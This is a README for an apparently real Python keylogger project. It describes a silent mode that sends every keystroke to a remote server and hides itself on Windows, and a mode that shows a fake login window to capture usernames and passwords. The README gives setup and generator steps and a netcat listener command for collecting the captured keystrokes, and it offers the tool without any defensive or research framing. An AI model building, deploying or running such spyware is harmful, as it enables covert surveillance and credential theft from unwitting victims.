## Overview

The Keylogger Application is a Python-based tool that functions in two modes:
1. Silent Keylogger: Captures keystrokes and sends them to a remote server in the background.
2. Keylogger with Login Application: Provides a GUI login interface along with keystroke logging.

The application supports automatic reconnection to the server if the connection fails and can hide itself on Windows by setting specific file attributes.

## Features

- Silent Keylogger: Runs silently in the background and logs all keystrokes.
- GUI Login Application: Displays a login interface where users can input their username and password.
- Automatic Reconnection: Reconnects to the server every 5 seconds if the connection is lost.
- Self-Hiding Functionality: On Windows, the script can hide itself using file attributes.

## Requirements

- Python 3.x: Ensure Python is installed on your system.
- Python Packages:
  - `pynput`: For capturing keyboard events.
  - `tkinter`: For the graphical user interface (GUI) in the login application.
  - `socket`: For network communication.
  - `subprocess`: For executing system commands.

## Installation

1. Clone the Repository:
   ```bash
   git clone https://github.com/POWERHSado/LOGkeyWin.git
   cd LOGkeyWin
   ```
2. Install Required Python Packages:
   ```bash
   pip install -r requirements.txt
3. Using the Generator
   ```bash
   bash gen.sh

   
## Usage

### Running the Setup Script

1. **Select the Application Type:**
   When you run the setup script, you'll be prompted to choose between:
   - Silent Keylogger
   - Keylogger with Login Application

2. **Enter the Server Details:**
   Provide the IP address and port of the server where the keystrokes will be sent.

3. **Enter the Output File Name:**
   Specify the name of the output file where the Python code will be saved.

### Silent Keylogger

The Silent Keylogger script will:
- Connect to the specified server.
- Log all keystrokes and send them to the server.
- Automatically reconnect to the server if the connection fails.

### Keylogger with Login Application

The Keylogger with Login Application script will:
- Display a login window with fields for username and password.
- Capture and send keystrokes to the server.
- Provide an interface to input and submit login credentials.

## Setup Listener with `nc`

To set up a listener that can receive the keystrokes sent by the keylogger, you can use `nc` (netcat), a versatile networking utility. Follow these steps to configure and run a listener on your server:

### Prerequisites

- Ensure `nc` (netcat) is installed on your server. You can install it using the package manager for your operating system:
  - **For Debian/Ubuntu:**
    ```bash
    sudo apt-get install netcat
    ```
  - **For Red Hat/CentOS:**
    ```bash
    sudo yum install nc
    ```
  - **For macOS:**
    ```bash
    brew install netcat
    ```

### Running the Listener

1. **Open a Terminal:**
   Access the terminal on your server where you want to listen for incoming connections.

2. **Start the Netcat Listener:**
   Run the following command to start listening on the port where the keylogger will send data. Replace `<PORT>` with the port number specified in your keylogger configuration.
   ```bash
   nc -l -p <PORT>
